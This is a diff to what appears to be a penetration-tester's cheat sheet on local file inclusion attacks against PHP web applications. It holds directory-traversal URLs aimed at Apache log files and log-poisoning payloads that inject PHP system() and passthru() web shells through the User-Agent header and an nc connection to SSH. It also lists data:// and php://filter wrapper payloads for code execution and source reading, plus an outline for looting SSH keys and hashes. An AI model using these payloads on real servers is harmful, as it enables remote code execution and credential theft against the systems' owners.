@@ -25,7 +25,8 @@ c:\Windows\System32\Drivers\etc\hosts
 	#Apache
 	1. Windows: http://example.com/file.php?file=/../../../xampp/apache2/logs/access.log | /../../../xampp/apache/logs/access.log
 	2. Linux: http://example.com/file.php?file=/../../../var/log/apache2/access.log | /../../../var/log/apache/access.log
-	#Pois
+	#Poison log
+	1. Payload: User-Agent: <?php echo system($_GET['cmd']); ?>
 
 	#SSH
 	#Check is it logging SSH connections?
@@ -33,8 +34,23 @@ c:\Windows\System32\Drivers\etc\hosts
 	#Poison log
 	1. nc -nv <ip> 22
 	2. Payload: Thisislogpoisoning/<?php passthru($_GET['cmd']); ?>
+
+#PHP Wrappers
+	#Data Wrapper - Code Execution!
+	1. http://example.com/file.php?file=data://text/plain,<%3fphp%2520echo%2520system('uname+-a')%3b%3f>
+	
+	#Filter Wrapper - Read PHP Files!
+	1. http://example.com/file.php?file=php://filter/convert.base64-encode/resource=../../../../var/www/html/backup.php
+	
 ```
 ##### PT
 ```
+#What can we read that would be useful?
+#SSH KEYS!
+1.
+2.
+3.
+
+#HASHES!
 
 ```
